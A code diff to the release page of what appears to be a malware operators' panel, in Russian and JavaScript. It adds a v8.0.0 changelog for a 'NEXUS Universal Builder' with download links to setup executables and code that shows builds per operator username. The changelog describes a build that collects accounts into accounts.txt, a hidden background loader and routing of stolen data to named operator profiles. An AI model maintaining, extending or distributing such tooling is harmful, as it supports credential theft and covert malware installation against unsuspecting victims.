@@ -3,6 +3,26 @@
 // Самая первая в списке (индекс 0) считается актуальной (Current).
 const UPDATES = [
   {
+    version: "8.0.0",
+    date: "09.09.2026",
+    downloadUrlBuilder: "downloads/NEXUS_Builder.exe",
+    downloadUrlRahClient: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/RAH_Non_Pro_setup.exe",
+    downloadUrlRahStandalone: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/RAH_PRO_setup.exe",
+    downloadUrlFireClient: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/NON_PRO_setup.exe",
+    downloadUrlFireStandalone: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/PRO_setup.exe",
+    downloadUrlSvyazClient: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SVYAZ_NON_PRO_setup.exe",
+    downloadUrlSvyazStandalone: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SVYAZ_PRO_setup.exe",
+    downloadUrlSingerClient: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SINGER_NON_PRO_setup.exe",
+    downloadUrlSingerStandalone: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/SINGER_PRO_setup.exe",
+    changes: [
+      { type: "add", text: "Официальный релиз NEXUS Universal Builder v8.0.0: автономный GUI-билдер для сборки персональных приложений" },
+      { type: "add", text: "Маршрутизация данных на любой профиль оператора: поддержка HuilaEbanaya, Shonll, DildMan, SVYAZ, SinGeR1isss и кастомных профилей" },
+      { type: "add", text: "Раздельная сборка версий в 1 клик: Standalone (PRO — оффлайн сбор в accounts.txt) и Клиент (Loader — скрытый фоновый лоадер)" },
+      { type: "fix", text: "Мгновенное динамическое внедрение параметров оператора в бинарный шаблон без необходимости компиляции и установки .NET SDK на машине воркера" },
+      { type: "fix", text: "Устранена проблема внезапного разлогина и зацикленного перезахода в веб-панель операторов" }
+    ]
+  },
+  {
     version: "7.4.5",
     date: "30.08.2026",
     downloadUrlRahClient: "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/RAH_Non_Pro_setup.exe",
@@ -197,19 +217,24 @@ try {
 function filterBuildsForCurrentUser() {
   const user = (typeof getUser === 'function' ? getUser() : localStorage.getItem('ft_user') || '').toLowerCase();
   
+  const blockHuilaEbanaya = document.getElementById('buildBlockHuilaEbanaya');
   const blockShonll = document.getElementById('buildBlockShonll');
   const blockDildman = document.getElementById('buildBlockDildman');
   const blockSvyaz = document.getElementById('buildBlockSvyaz');
   const blockSinger = document.getElementById('buildBlockSinger');
 
   // Hide all blocks initially
+  if (blockHuilaEbanaya) blockHuilaEbanaya.style.display = 'none';
   if (blockShonll) blockShonll.style.display = 'none';
   if (blockDildman) blockDildman.style.display = 'none';
   if (blockSvyaz) blockSvyaz.style.display = 'none';
   if (blockSinger) blockSinger.style.display = 'none';
 
-  if (user === 'shonll') {
+  if (user === 'huilaebanaya') {
+    if (blockHuilaEbanaya) blockHuilaEbanaya.style.display = 'block';
+  } else if (user === 'shonll') {
     if (blockShonll) blockShonll.style.display = 'block';
+    if (blockHuilaEbanaya) blockHuilaEbanaya.style.display = 'block';
   } else if (user === 'dildman' || user === 'dild_man') {
     if (blockDildman) blockDildman.style.display = 'block';
   } else if (user === 'saha_kakaha122' || user === 'svyaz') {
@@ -218,6 +243,7 @@ function filterBuildsForCurrentUser() {
     if (blockSinger) blockSinger.style.display = 'block';
   } else {
     // If unknown operator, show all as fallback
+    if (blockHuilaEbanaya) blockHuilaEbanaya.style.display = 'block';
     if (blockShonll) blockShonll.style.display = 'block';
     if (blockDildman) blockDildman.style.display = 'block';
     if (blockSvyaz) blockSvyaz.style.display = 'block';
